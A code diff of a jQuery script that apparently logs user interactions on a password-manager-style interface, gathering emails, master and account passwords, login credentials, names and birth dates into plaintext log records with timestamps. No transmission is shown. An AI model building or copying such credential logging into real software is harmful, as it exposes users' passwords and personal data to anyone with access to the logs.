@@ -125,31 +125,53 @@ $(document).ready(function() {
     if (inputVal6) {
         logPasswordP9 = inputVal6.val();
     }
+
     var inputVal7 = $(".editPassword2");
     var logPasswordP91 = "";
     if (inputVal7) {
         logPasswordP91 = inputVal7.val();
+        if (logPasswordP91 != "") {
+          // logContentPage3 = "password acc2= " + logPasswordP91 ;
+
+        }
     }
     var inputVal8 = $(".editPassword3");
     var logPasswordP92 = "";
     if (inputVal8) {
         logPasswordP92 = inputVal8.val();
+        if (logPasswordP92 != "") {
+           // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92;
+
+        }
     }
     var inputVal9 = $(".editPassword4");
     var logPasswordP93 = "";
     if (inputVal9) {
         logPasswordP93 = inputVal9.val();
+        if (logPasswordP93 != "") {
+           // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 ;
+
+        }
     }
     var inputVal10 = $(".editPassword5");
     var logPasswordP94 = "";
     if (inputVal10) {
         logPasswordP94 = inputVal10.val();
+        if (logPasswordP94 != "") {
+           // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94;
+
+        }
     }
     var inputVal11 = $(".editPassword6");
     var logPasswordP95 = "";
     if (inputVal11) {
         logPasswordP95 = inputVal11.val();
+        if (logPasswordP95 != "") {
+           // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94 + "password acc6= " + logPasswordP95;
+
+        }
     }
+
     var inputVal12 = $("#loginEmail");
     var logLoginEmail = "";
     if (inputVal12) {
@@ -189,17 +211,24 @@ $(document).ready(function() {
 
     logContentPage1 = "Page1: " + "Email= " + logEmail + " - " + "Password= " + logPassword + " - " + "rePassword= " + logMasterRePassword +
                       "Page2: " + "masterPassword= " + logMasterPassword +
-                      "Page6: " + "websiteName= " + logWebsiteName +
-                      "Page9: " + "username= " + logUsername + "password user1= " + logPasswordP9 + "password user2= " + logPasswordP91 + "password user3= " + logPasswordP92 + "password user4= " + logPasswordP93 + "password user5= " + logPasswordP94 + "password user6= " + logPasswordP95
+                      "Page6: " + "websiteName= " + logWebsiteName;
 
-    logContentPage2 =
-                      "loginPage: " + "Email= " + logLoginEmail + "Password= " + logLoginPassword +
+    logContentPage2 = "Page9: " + "username= " + logUsername + "password acc1= " + logPasswordP9;
+
+    // logContentPage3 = "password acc2= " + logPasswordP91 + "password acc3= " + logPasswordP92 + "password acc4= " + logPasswordP93 + "password acc5= " + logPasswordP94 + "password acc6= " + logPasswordP95;
+    logContentPage3 = "--";
+
+
+    logContentPage4 ="loginPage: " + "Email= " + logLoginEmail + "Password= " + logLoginPassword +
                       "createPage: " + "Email= " + logCreateEmail + "Password= " + logCreatePassword + "FirstName= " + logFirstName + "LastName= " + logLastName + "DateOfBirth= " + logdob;
+
       var newItem =
       {
        'class': $(this).attr('class'),
        'content': logContentPage1,
        'content1': logContentPage2,
+       'content2': logContentPage3,
+       'content3': logContentPage4,
        'timestamp': Date.now()
       };
 
